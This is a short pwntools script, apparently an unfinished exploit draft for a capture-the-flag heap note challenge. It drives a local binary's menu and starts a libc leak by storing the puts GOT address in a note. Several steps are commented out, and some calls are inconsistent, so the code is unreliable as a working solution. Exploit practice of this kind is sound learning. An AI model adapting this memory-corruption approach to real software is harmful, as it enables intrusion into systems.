from pwn import *

p = process("./prob")
e = ELF("./prob")
libc = ELF("./libc.so.6")

context.binary = e
# context.log_level = 'debug'

def create_note(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', str(data).encode())
    
def read_note(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())
    
def update_note(idx, size, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)
    
def delete_note(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())
    
    
create_note(40, e.got.puts)  # Create a note to leak libc
pause()
p.interactive()
# create_note(0, 0x20, b'A' * 0x10)  # Create a note to leak libc
# create_note(0, 0x10, b'A' * 0x10)  # Create a note to leak libc

# delete_note(1)

# create_note()

# pause()

# p.interactive()